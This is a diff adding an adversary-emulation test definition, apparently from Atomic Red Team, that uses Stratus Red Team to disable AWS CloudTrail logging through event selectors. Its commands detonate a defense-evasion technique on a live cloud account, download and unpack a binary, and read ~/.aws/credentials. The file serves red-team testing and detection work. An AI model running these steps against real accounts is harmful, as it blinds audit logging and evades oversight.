@@ -1,0 +1,50 @@
+{
+    "name": "AWS - Disable CloudTrail Logging Through Event Selectors using Stratus",
+    "description": "Update event selectors in AWS CloudTrail to disable the logging of certain management events to evade defense. This Atomic test leverages a tool called Stratus-Red-Team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/ ",
+    "supported_platforms": [
+        "linux",
+        "macos",
+        "iaas:aws"
+    ],
+    "dependency_executor_name": "sh",
+    "executor": {
+        "command": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.cloudtrail-event-selectors\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force\n",
+        "cleanup_command": "export AWS_REGION=#{aws_region}\necho \"Cleanup detonation\"\ncd #{stratus_path}\n./stratus cleanup --all\nrm -rf stratus*\n",
+        "name": "sh",
+        "elevation_required": false,
+        "type": "Command Executor"
+    },
+    "id": "T1562.008",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "Disable or Modify Cloud Logs",
+    "source": "ART",
+    "uuid": "a27418de-bdce-4ebd-b655-38f11142bf0c",
+    "arguments": {
+        "stratus_path": {
+            "description": "Path of stratus binary",
+            "type": "path",
+            "default": "$PathToAtomicsFolder/T1562.008/src"
+        },
+        "aws_region": {
+            "description": "AWS region to detonate",
+            "type": "string",
+            "default": "us-west-2"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Stratus binary must be present at the (#{stratus_path}/stratus)\n",
+            "prereq_command": "if [ -f #{stratus_path}/stratus ]; then exit 0; else exit 1; fi;\n",
+            "get_prereq_command": "if [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nelif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) \n  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi\n"
+        },
+        {
+            "description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
+            "prereq_command": "cat ~/.aws/credentials | grep \"default\"\n",
+            "get_prereq_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
